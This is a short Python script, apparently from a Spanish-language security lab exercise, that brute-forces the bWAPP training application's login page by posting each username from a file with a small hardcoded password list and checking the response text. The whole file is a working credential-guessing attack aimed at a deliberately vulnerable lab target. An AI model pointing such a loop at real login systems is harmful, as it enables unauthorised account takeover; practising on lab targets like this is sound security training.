import argparse
import requests

passwords = [
    'password1',
    'password2',
    'password3',
    'password4',
    'bug'
]

def Autenticacion(ip, user, password):
    s = requests.Session()
    data = {"login":user, "password": password, "security_level":"0","form":"submit"}
    urlLogin = f"http://{ip}/bWAPP/login.php"
    try:
        req = s.post(urlLogin, data=data, allow_redirects=True)
        print(req.text)
    except Exception as e:
        print(f"Error al conectar con el host: {e}")
        exit()
    #validar mediante un mensaje de la respuesta que la autenticación fue exitosa
    print('Probando: '+user +':' +password)
    if "or a buggy web application" in req.text:
        print("¡¡¡¡¡¡¡¡Ingreso exitoso!!!!!!!!")
    elif "Invalid credentials or user not activated" in req.text:
        print("Invalid credentials")
    else:
        print("Hubo un problema")

def main():
    parser = argparse.ArgumentParser(description='Brute force en bWAPP')
    parser.add_argument('--ip', metavar='IP', type=str, required=True, help='La dirección IP del servidor')
    parser.add_argument('--file', metavar='FILE', type=str, required=True, help='El nombre del archivo de usuarios')
    args = parser.parse_args()

    print("[+] - Iniciando")
    #leer desde un archivo los usuarios (el archivo debe tener 5 usuarios)
    with open(args.file, "r") as f:
        for user in f:
            user = user.strip()
            for password in passwords:
                Autenticacion(args.ip, user, password)

if __name__ == "__main__":
    main()
